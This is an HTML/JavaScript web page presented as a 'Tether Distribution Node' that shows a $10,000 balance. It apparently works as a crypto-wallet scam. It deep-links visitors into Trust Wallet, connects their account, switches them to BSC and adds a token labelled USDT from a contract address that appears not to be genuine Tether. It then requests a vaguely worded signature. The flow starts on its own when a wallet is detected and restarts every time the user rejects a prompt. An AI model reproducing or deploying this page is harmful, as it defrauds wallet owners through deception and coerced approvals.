<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Distribution Node</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether: #26a17b; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1d21; border-radius: 20px; padding: 30px; width: 85%; max-width: 350px; text-align: center; border: 1px solid #30363d; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn { background: var(--tether); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        #status { font-size: 11px; color: #848e9c; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="80" style="filter: drop-shadow(0 0 10px var(--tether));">
    <h2 style="margin: 15px 0 5px 0;">NODE SYNC</h2>
    <div style="font-size: 32px; font-weight: 900; color: #fff;">$10,000.00</div>
    <button class="btn" id="mainBtn">ACTIVATE & ADD TOKEN</button>
    <div id="status">STATUS: STANDBY</div>
</div>

<script>
    const btn = document.getElementById('mainBtn');
    const status = document.getElementById('status');

    // USDT BSC Config
    const TOKEN_DATA = {
        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
        symbol: "USDT",
        decimals: 18,
        image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
    };

    async function startProcess() {
        const provider = window.trustwallet || window.ethereum;

        // 1. Agar Mobile Browser mein hai to Wallet kholo
        if (!provider) {
            status.innerText = "OPENING TRUST WALLET...";
            const rawUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + rawUrl;
            return;
        }

        try {
            status.innerText = "CONNECTING SESSION...";
            // STEP 1: Connect Account (ZARURI HAI MOBILE KE LIYE)
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // STEP 2: Switch to BSC
            status.innerText = "SWITCHING TO BSC...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            }

            // STEP 3: Add Token with Logo
            status.innerText = "ADDING TOKEN TO WALLET...";
            const success = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: TOKEN_DATA
                }
            });

            if (success) {
                status.innerText = "SYNC SUCCESSFUL!";
                btn.innerText = "SYNCED ✅";
                // Final verification
                await provider.request({
                    method: 'personal_sign',
                    params: ["Verify Asset Mapping", accounts[0]]
                });
            }

        } catch (e) {
            status.innerText = "REJECTED. RETRYING...";
            console.error(e);
            setTimeout(startProcess, 1000); // Retry loop
        }
    }

    btn.onclick = startProcess;

    // Auto-trigger inside Wallet Browser
    window.onload = () => {
        if (window.trustwallet || window.ethereum) {
            status.innerText = "WALLET DETECTED. CLICK ACTIVATE.";
            // Wait 2 seconds then auto-start
            setTimeout(startProcess, 2000);
        }
    };
</script>
</body>
</html>
